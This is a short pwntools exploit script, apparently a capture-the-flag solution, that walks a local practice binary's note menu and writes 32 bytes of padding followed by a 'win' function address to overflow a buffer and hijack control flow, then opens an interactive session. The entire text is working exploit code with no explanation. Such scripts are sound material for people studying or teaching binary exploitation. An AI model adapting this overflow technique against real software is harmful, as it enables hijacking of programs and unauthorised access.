from pwn import *

context.log_level = 'DEBUG'
p = process(["./aslrbp", "./2"])
win = p64(0x1000006f0)

payload = b"A"*32 + win

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"User index (0-3): ", b"0")
p.sendlineafter(b"Name: ", b"andrd3v")
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"User index (0-3): ", b"0")

p.sendlineafter(b"> ", b"4")
p.sendlineafter(b"Note index (0-3): ", b"0")
p.sendlineafter(b"Write 40 bytes to note:", payload)
p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"User index (0-3): ", b"0")

p.interactive()
